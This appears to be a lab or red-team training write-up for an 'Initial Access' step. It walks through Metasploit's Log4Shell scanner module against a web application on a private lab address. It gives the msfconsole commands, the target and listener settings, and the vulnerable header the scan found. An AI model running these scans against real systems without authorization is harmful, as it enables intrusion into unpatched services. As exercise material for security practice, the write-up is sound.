# **Initial Access:** 

## Objective:

After getting to know that there’s a web application running on port 8080, an attacker might want to identify vulnerable components within the target's infrastructure, e.g a Log4Shell vulnerability.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeOouFC88c29qqI-7YWBncSaloHwjWG79ONuoHym0vpv-RCOqCUEcjPbDO4zrhgwpiji41DEXfign-m2frRYgVWTlW_Tk6D9L76UU2s-QMxhOI7ZsI3E-R-9qImRW5eraE3qkD4oXE3FD-3OAUkb8nV4-VI?key=ZVE4yllmhIbKOidz4k1V_g)

**Img 1**: Web application running on 10.208.89.15:8080. 


## MITRE Technique: T0819 - Initial Access

## Tools/Services:

- Metasploit Framework

- Module: `auxiliary/scanner/http/log4shell_scanner`

**Img 2**: Log4Shell scripts available in Metasploit.

## Scenarios:

An attacker uses a scanner to detect the presence of the Log4Shell vulnerability in an HTTP server. The scanner checks for specific HTTP headers and URIs to determine if the target system is vulnerable and how he could set the exploit.

## Applying Scenario:

1. **Setup**: Launch Metasploit and use the `auxiliary/scanner/http/log4shell_scanner` module.

```
# Launch metasploit
sudo msfconsole

# Search for the log4shell scripts
search log4

# Use the auxiliary/scanner/http/log4shell_scanner
use 6

```

2. **Configuration**: Set `RHOSTS` to the target IP,, `RPORT` to the target port, and `SRVHOST` and `SRVPORT` to the attacker's IP and port, respectively. Then run the scanner to identify the vulnerability.

```
setg RHOSTS <target-ip>  # 10.208.89.15
setg RPORT <target-port> # 8080
setg SRVHOST <host-server-ip> # 10.208.5.100
setg LHOST <listen-server-ip> # 10.208.5.100
setg SRVPORT <host-server-port> # 1389
setg TARGETURI <target url> # /

# Run
exploit

```
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcKfX58vWLDJADvvnNtTa7LHQBoctWNlSAzKCUv5PMNPuxvFu0ClXU-LyFtRfUZhu5UlDjejWIUqXdcGN_mcCFmEMrhYKzoeEv0XsQW2mGtxx9_vn-9NVQkBL9ujj2XewYgkm0oyRhkKpL92h6un2ky0CMP?key=ZVE4yllmhIbKOidz4k1V_g)

**Img 3**: Setting up Log4Shell scanner in Metasploit.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcrAxbR-vj3VvhfqpKlIDehlBbqXomy9P9cPNCrShlUaX1tm3Zkz0l-0UvsuFz3Vxje8DXtNiHafUUywyUBwzFkri4l_ratALWKsodelNhBJcfEet-FUF-VaPbKEALVkBGUqv-4H19EFNZGY7_3RDKVIUGy?key=ZVE4yllmhIbKOidz4k1V_g)

**Img 4**: Discovering the Log4Shell vulnerability and the needed information to exploit it e.g. URL: / , with header: X-Api-Version.
